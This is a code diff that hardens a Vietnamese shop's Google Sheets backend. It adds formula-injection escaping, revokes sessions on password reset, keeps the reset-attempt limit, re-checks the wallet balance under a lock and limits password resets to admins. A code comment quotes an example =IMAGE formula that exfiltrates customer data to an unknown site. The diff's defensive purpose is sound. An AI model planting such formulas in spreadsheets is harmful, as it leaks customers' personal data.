@@ -12,7 +12,7 @@ const SH = {
   ledger: { name: 'SoCaiVi', header: ['Thời gian', 'SĐT', 'Loại', 'Số tiền (+/-)', 'Số dư trước', 'Số dư sau', 'Mã đơn / ghi chú'] },
   stock: { name: 'Kho', header: ['ID sản phẩm', 'Nội dung giao cho khách (acc | mk | hướng dẫn)', 'Mã đơn đã giao', 'Ngày giao'] },
   orders: { name: 'DonHang', header: ['Mã đơn', 'Token', 'Thời gian đặt', 'ID sản phẩm', 'Tên sản phẩm', 'Số tiền', 'Zalo/SĐT khách', 'Khách gửi thêm', 'Trạng thái', 'Nội dung giao cho khách', 'Thời gian nhận tiền', 'Mã GD ngân hàng', 'Họ tên', 'Gmail'] },
-  customers: { name: 'KhachHang', header: ['SĐT/Zalo', 'Họ tên', 'Gmail', 'Lần đầu vào', 'Lần cuối vào', 'Số đơn đã đặt', 'Mật khẩu (đã mã hoá, xoá ô này = cho khách đặt lại)', 'Salt', 'Số dư ví (đ)', 'Vai trò (admin/staff, để trống = khách thường)'] },
+  customers: { name: 'KhachHang', header: ['SĐT/Zalo', 'Họ tên', 'Gmail', 'Lần đầu vào', 'Lần cuối vào', 'Số đơn đã đặt', 'Mật khẩu (đã mã hoá — đặt lại bằng nút trong trang admin)', 'Salt', 'Số dư ví (đ)', 'Vai trò (admin/staff, để trống = khách thường)'] },
   sessions: { name: 'PhienDangNhap', header: ['Mã phiên (đã mã hoá)', 'SĐT', 'Tạo lúc', 'Hết hạn (ms)'] },
   deposits: { name: 'NapTien', header: ['Mã nạp', 'Token', 'Thời gian tạo', 'SĐT', 'Số tiền', 'Trạng thái', 'Mã GD ngân hàng', 'Thời gian cộng ví'] },
   visits: { name: 'LuotTruyCap', header: ['Ngày', 'Lượt mở trang', 'Máy mới (lần đầu vào)'] },
@@ -318,6 +318,8 @@ function cleanCustomer(b) {
 // Sheet hay tự đổi "0912..." thành số 912... nên so sánh sau khi chuẩn hoá
 function normPhone(p) { return String(p).replace(/\D/g, '').replace(/^84/, '').replace(/^0*/, '0'); }
 function textCell(s) { return "'" + s; }
+// Chữ do khách/ngân hàng gửi lên: thêm ' phía trước nếu bắt đầu bằng = + - @ để Sheet không chạy như công thức (vd =IMAGE("web-lạ?"&A2) lén gửi dữ liệu khách ra ngoài)
+function safeCell(s) { s = String(s == null ? '' : s); return /^[=+\-@\t\r]/.test(s) ? "'" + s : s; }
 
 // ===== Tài khoản khách =====
 const K = { phone: 0, name: 1, email: 2, first: 3, last: 4, orders: 5, hash: 6, salt: 7, balance: 8, role: 9 };
@@ -428,6 +430,14 @@ function logout(token) {
   return { ok: true };
 }
 
+// Đổi/đặt lại mật khẩu → đăng xuất mọi máy đang đăng nhập tài khoản này
+function revokeSessions(phone) {
+  const sh = sheetOf(SH.sessions);
+  const p = normPhone(phone);
+  const rows = sh.getDataRange().getValues();
+  for (let i = 1; i < rows.length; i++) if (normPhone(rows[i][1]) === p && Number(rows[i][3]) > 0) sh.getRange(i + 1, 4).setValue(0);
+}
+
 // Chống spam đăng ký: ô bẫy (bot điền vào), điền form quá nhanh (<3 giây), và tối đa REG_LIMIT tài khoản mới mỗi 10 phút trên toàn shop
 const REG_LIMIT = 20;
 function checkRegSpam(b) {
@@ -452,13 +462,15 @@ function register(b) {
     if (f.data && f.data[K.hash]) throw new Error('Số này đã có tài khoản. Hãy bấm "Đăng nhập".');
     const salt = newToken().slice(0, 16);
     if (f.data) {
-      // Hàng đã có nhưng chưa có mật khẩu (admin vừa đặt lại) → hoàn tất đăng ký lại, GIỮ NGUYÊN số dư ví/vai trò/lịch sử đơn
-      f.sh.getRange(f.row, K.name + 1).setValue(c.name);
-      f.sh.getRange(f.row, K.email + 1).setValue(c.email);
+      // Hàng đã có nhưng chưa có mật khẩu (khách cũ từ trước khi có tài khoản) → cho đăng ký tiếp.
+      // Nếu hàng đang có tiền trong ví hoặc có vai trò (admin/nhân viên/bị khoá) thì KHÔNG cho ai tự nhận, tránh người lạ biết SĐT là chiếm được ví/quyền.
+      if ((Number(f.data[K.balance]) || 0) > 0 || String(f.data[K.role] || '')) throw new Error('Tài khoản này cần shop xác nhận. Vui lòng nhắn Zalo shop để được cấp mật khẩu.');
+      f.sh.getRange(f.row, K.name + 1).setValue(safeCell(c.name));
+      f.sh.getRange(f.row, K.email + 1).setValue(safeCell(c.email));
       f.sh.getRange(f.row, K.hash + 1, 1, 2).setValues([[hashPw(pw, salt), salt]]);
       f.sh.getRange(f.row, K.last + 1).setValue(now());
     } else {
-      f.sh.appendRow([textCell(c.phone), c.name, c.email, now(), now(), 0, hashPw(pw, salt), salt, 0, '']);
+      f.sh.appendRow([textCell(c.phone), safeCell(c.name), safeCell(c.email), now(), now(), 0, hashPw(pw, salt), salt, 0, '']);
     }
     const fresh = findCustomer(c.phone).data;
     return { customer: publicCustomer(fresh), session: createSession(c.phone, b.remember) };
@@ -503,10 +515,10 @@ function forgotPassword(b) {
   if (!f.data || !f.data[K.hash]) throw new Error('Số này chưa có tài khoản. Hãy bấm "Tạo tài khoản".');
   const email = String(f.data[K.email] || '');
   if (!email) throw new Error('Tài khoản chưa có Gmail, vui lòng nhắn Zalo shop để được hỗ trợ.');
-  const code = randomStr(6, '0123456789');
+  const code = secureDigits(6);
   cache.put('resetcode_' + npPhone, code, 600);
   cache.put(cooldownKey, '1', 60);
-  cache.remove('resetfail_' + npPhone);
+  // KHÔNG xoá bộ đếm nhập sai ở đây: nếu xoá, kẻ gian chỉ cần bấm gửi mã mới mỗi phút là được đoán tiếp không giới hạn
   MailApp.sendEmail(email, '[' + SHOP.name + '] Mã đặt lại mật khẩu',
     'Mã đặt lại mật khẩu của bạn là: ' + code + '\nMã có hiệu lực trong 10 phút.\nNếu không phải bạn yêu cầu, hãy bỏ qua email này.');
   return { ok: true, email: maskEmail(email) };
@@ -534,6 +546,7 @@ function resetPassword(b) {
     if (!f.data) throw new Error('Không tìm thấy khách hàng');
     const salt = newToken().slice(0, 16);
     f.sh.getRange(f.row, K.hash + 1, 1, 2).setValues([[hashPw(pw, salt), salt]]);
+    revokeSessions(phone);
     cache.remove(codeKey);
     cache.remove(failKey);
     cache.remove('fail_' + npPhone);
@@ -594,8 +607,11 @@ function createOrder(b) {
   const lock = LockService.getScriptLock();
   lock.waitLock(20000);
   try {
-    if (c.balance < total) {
-      throw new Error('Số dư ví (' + fmt(c.balance) + ') không đủ. Vui lòng nạp thêm ít nhất ' + fmt(total - c.balance) + '.');
+    // Đọc lại số dư SAU khi khoá: 2 đơn bấm cùng lúc thì đơn sau thấy số dư đã bị trừ, không trừ nhầm "Số lượng còn" rồi mới báo thiếu tiền
+    const cur = findCustomer(c.phone);
+    const balance = cur.data ? Number(cur.data[K.balance]) || 0 : 0;
+    if (balance < total) {
+      throw new Error('Số dư ví (' + fmt(balance) + ') không đủ. Vui lòng nạp thêm ít nhất ' + fmt(total - balance) + '.');
     }
     if (!takeQty(p.id, count)) {
       const left = qtyOf((findProductRow(p.id).data || [])[11]);
@@ -611,7 +627,7 @@ function createOrder(b) {
     const base = p.deliver || takeStocks(p.id, code, count);
     const item = base ? withGuide(base, p.guide) : base;
     const status = item ? ST.DONE : ST.PAID;
-    sh.appendRow([code, token, now(), p.id, pname, total, textCell(c.phone), extra, status, item || '', now(), 'Ví', c.name, c.email]);
+    sh.appendRow([code, token, now(), p.id, pname, total, textCell(c.phone), safeCell(extra), status, item || '', now(), 'Ví', safeCell(c.name), safeCell(c.email)]);
     if (item) {
       notifyOwner('✅ Đơn ' + code + ' trả bằng VÍ ' + fmt(total) + ' — ĐÃ TỰ GIAO\n' + pname + '\nKhách: ' + c.name + ' — ' + c.phone + ' — ' + c.email);
       notifyCustomerDelivered(c.email, c.name, pname, item);
@@ -746,7 +762,7 @@ function handleSepay(e) {
         result = 'Khớp đơn';
       }
     }
-    txSh.appendRow([txId, now(), amount, content, code, result]);
+    txSh.appendRow([textCell(txId), now(), amount, safeCell(content), code, result]);
     if (result === 'Không có mã' || result === 'Mã đơn không tồn tại' || result === 'Mã nạp không tồn tại') {
       notifyOwner('💰 Tiền về ' + fmt(amount) + ' nhưng không khớp mã nào.\nNội dung: ' + content);
     }
@@ -921,10 +937,11 @@ function adminUnbanCustomer(b) {
   } finally { lock.releaseLock(); }
 }
 
-// Xoá mật khẩu (KHÔNG thể xem lại mật khẩu cũ vì đã băm 1 chiều, không lưu chữ thường) — khách tự vào web bấm
-// "Tạo tài khoản" với đúng SĐT này để đặt mật khẩu mới; số dư ví/vai trò/lịch sử đơn được giữ nguyên.
+// Đặt mật khẩu tạm (KHÔNG thể xem lại mật khẩu cũ vì đã băm 1 chiều) — trả mật khẩu tạm cho admin gửi khách qua Zalo,
+// khách đăng nhập rồi tự đổi bằng "Quên mật khẩu". Số dư ví/vai trò/lịch sử đơn giữ nguyên.
+// Chỉ admin: trước đây nhân viên cũng xoá được mật khẩu (kể cả của admin) rồi tự "Tạo tài khoản" lại với SĐT đó để chiếm ví/quyền admin.
 function adminResetPassword(b) {
-  requireRole(b.session, [ROLE.ADMIN, ROLE.STAFF]);
+  requireRole(b.session, [ROLE.ADMIN]);
   const phone = String(b.phone || '').replace(/[^0-9+]/g, '');
   if (!phone) throw new Error('Thiếu số điện thoại');
   const lock = LockService.getScriptLock();
@@ -932,9 +949,13 @@ function adminResetPassword(b) {
   try {
     const f = findCustomer(phone);
     if (!f.data) throw new Error('Không tìm thấy khách hàng');
-    f.sh.getRange(f.row, K.hash + 1, 1, 2).setValues([['', '']]);
-    notifyOwner('🔑 Admin đã xoá mật khẩu tài khoản: ' + phone + ' (' + f.data[K.name] + ') để khách đặt lại');
-    return { ok: true };
+    const temp = randomStr(4, 'abcdefghjkmnpqrstuvwxyz') + secureDigits(4);
+    const salt = newToken().slice(0, 16);
+    f.sh.getRange(f.row, K.hash + 1, 1, 2).setValues([[hashPw(temp, salt), salt]]);
+    revokeSessions(phone);
+    CacheService.getScriptCache().remove('fail_' + normPhone(phone));
+    notifyOwner('🔑 Admin đã đặt mật khẩu tạm cho tài khoản: ' + phone + ' (' + f.data[K.name] + ')');
+    return { ok: true, tempPassword: temp };
   } finally { lock.releaseLock(); }
 }
 
@@ -966,12 +987,12 @@ function adminUpdateOrder(b) {
     if (!found) throw new Error('Không tìm thấy đơn');
     if (found.data[O.status] === ST.DONE) throw new Error('Đơn này đã giao rồi');
     const content = String(b.content || '').trim().slice(0, 4000);
-    if (content) sh.getRange(found.row, O.content + 1).setValue(content);
+    if (content) sh.getRange(found.row, O.content + 1).setValue(safeCell(content));
     if (b.markDone) {
       let finalContent = content || String(found.data[O.content] || '');
       if (!finalContent) throw new Error('Cần nhập nội dung giao trước khi đánh dấu đã giao');
       finalContent = withGuide(finalContent, guideOf(found.data[O.pid]));
-      sh.getRange(found.row, O.content + 1).setValue(finalContent);
+      sh.getRange(found.row, O.content + 1).setValue(safeCell(finalContent));
       sh.getRange(found.row, O.status + 1).setValue(ST.DONE);
       notifyCustomerDelivered(found.data[O.email], found.data[O.name], found.data[O.pname], finalContent);
     }
@@ -1231,6 +1252,12 @@ function now() { return Utilities.formatDate(new Date(), TZ, 'dd/MM/yyyy HH:mm:s
 // Sheet đôi khi tự chuyển ô "giờ dạng chữ" thành ô Ngày giờ thật (đọc ra là object Date) → ép về đúng chữ hiển thị trước khi trả cho web.
 function fmtDate(v) { return v instanceof Date ? Utilities.formatDate(v, TZ, 'dd/MM/yyyy HH:mm:ss') : v; }
 function fmt(n) { return Number(n).toLocaleString('vi-VN') + 'đ'; }
+// Số ngẫu nhiên khó đoán (dùng UUID của Google thay vì Math.random) cho mã đặt lại mật khẩu
+function secureDigits(len) {
+  let s = '';
+  while (s.length < len) s += String(parseInt(Utilities.getUuid().replace(/-/g, '').slice(0, 12), 16) % 1e6).padStart(6, '0');
+  return s.slice(0, len);
+}
 function randomStr(len, chars) {
   let s = '';
   for (let i = 0; i < len; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
